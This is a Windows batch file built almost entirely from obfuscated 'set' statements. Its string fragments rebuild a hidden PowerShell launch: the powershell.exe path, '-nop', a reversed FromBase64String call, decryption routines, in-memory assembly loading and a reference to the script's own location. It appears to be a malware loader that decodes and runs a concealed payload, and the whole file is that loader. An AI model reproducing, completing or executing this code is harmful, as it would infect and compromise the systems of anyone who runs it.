@echo off
set "TwtJfociSU=.e"
set "uLjWbBirqR=po"
set "DXaJPucIpg= /"
set "kMwYohIKbn=Wi"
set "VuAKekABIi=ll"
set "CGTAJRgefO=Sy"
set "XcTVfwuKTR=s\"
set "jQJhZkqVNo= C"
set "ASxtKpauUe=\v"
set "abbrYHgoqi=Po"
set "gfJbdhwFzH=rs"
set "EOyUnOTbBJ=nd"
set "kRBZtIEGIY=st"
set "gKSHJIemMm=he"
set "FCjAUuxVeV=co"
set "xDYapCUCPQ=em"
set "WDpotbIRSV=do"
set "jGZXRgBTBx=\W"
set "ROwZBGqLDP=we"
set "uFKbhVCXpM=he"
set "etwRTdjqCm=0\"
set "RNcUtYHTkh=in"
set "FEYsCdScJy=:\"
set "uojNOleuSG=1."
set "fCRJKjovBJ=xe"
set "yKaGxUmSfC=rS"
set "UhdlrHkNWS=we"
set "RlfnNKqjBv=y "
set "uiiKhyIHgy=32"
set "eBiPqpKeLb=ow"
set "ZXAkPREbij=ws"
set "UJxoeQfCtp=py"
set "cMdaLXpkzm=ll"
set "cfnfriaeMm= %~dp0"
set "aDNbsmhDmE=cd"
set "dfMpzlECWi=ment"
set "SEYcZOEIBB=j = "
set "CaPcJGLiux=Zfd "
set "YVBBDmXcmZ=e]::"
set "hnCXUAVRTa=join"
set "ILalsQDKhT=$HIB"
set "GSxcvJugfX=New-"
set "jjdYtRuOCD=Pi, "
set "yYYjQWNfDj=brea"
set "WhyYjBCsii=ql ="
set "buiRhyWIUf=]::("
set "dNHOmJEsKJ=m(, "
set "QaiWfCBzgz=Obje"
set "wSMQliaCnt=W = "
set "DlBixkgXUe=ode]"
set "IwtiWDgUro=rity"
set "vnqVHhVRBF= if "
set "JeuKzutAli=zHhH"
set "ANwhfaRkrD=e = "
set "sONFUVzBrD=orF'"
set "sYRgANYKVY=ecry"
set "HTfyrbsjFL=n ''"
set "aCHjTPSvJJ=16] "
set "GIEtFtgGCG=);$R"
set "iUgNlMlxly=ach "
set "JeGKsAMIRE=[]] "
set "jEWQprpmHB=yste"
set "OrQADjhTZe=-4] "
set "XfawxeoYDr=).Sp"
set "XDMbZxWdoC=K.Su"
set "TBsUiPqXgq=nwK "
set "OYcDTWUaYQ=Star"
set "HwTArYPwQJ=t Sy"
set "tvUdbhLXhs=pStr"
set "uqEWcIFTUq=SIgm"
set "qvonQYHezu=-joi"
set "WveXoCVjqO=;$Qg"
set "dAHUCLBAQf= [st"
set "NxtUEWVVTq=gMod"
set "fMkutTsuHl=rDqQ"
set "tIslppeCcG=, $S"
set "SRaKsAFqqR=$RrD"
set "ZirzgoUlJK=ring"
set "qhDcFbzwOw=[-1."
set "LZjmKpONZs=.Mem"
set "NDNYScJQpa=grap"
set "eyXIhCIwCA=]::N"
set "MFBfFhjVZH=stem"
set "imCTgDYIDf=lit("
set "iSoJLeNyOJ=.Ass"
set "PxZFjmuVMb=();$"
set "JLIhJqfTlm=raph"
set "ointVMYsGN=gth)"
set "ZeqqQWnzko=ck($"
set "AXKLaWgLNd=qQ.I"
set "jlCGPjbjlT=rtS4"
set "eKcabMUbiC=d;$R"
set "aGjLprJDyX=3); "
set "ubFFEKAqxc=[IO."
set "HyOnRJbZvJ=Invo"
set "WseLxseqGH= '')"
set "dBKucGLJaT=('%*'"
set "HpKKPXeNEm=yMdR"
set "gPxIuwHOIH=-Obj"
set "icyLeCJfZP=CFxo"
set "cnxtVJcdiK=dj0C"
set "eraPrtIyjh=join"
set "tuSTDmXIKy=Fina"
set "QVbysnaSlq=;$rp"
set "LcBgAtJPOr=ionM"
set "IVbOEYxVmj=$SIg"
set "TfSbrBDPqq=rDqQ"
set "HFVBSnbaOt=gnir"
set "HEUrBkwltF=File"
set "pafXQoGyQp=ddin"
set "MKRehtAwhw=[Sys"
set "TAEZOspiXj=YxVw"
set "IkVZPChBBC=$Wwi"
set "EVupmjkceV=-nop"
set "vckKkmTRoO=tS46"
set "UvExuubmLv= = $"
set "ERyICBtMTC=bQZ."
set "wEyfpDnjrD=cDDS"
set "dxhOuPDXHT=raph"
set "UDLDPGIVMg=esaB"
set "FZuFTjciqS=pher"
set "AsyYDnMpvT=pose"
set "LiKBAUVjvM=L4Yi"
set "LTlsqHMaGm=esMa"
set "dHfrcXDXgw=);$H"
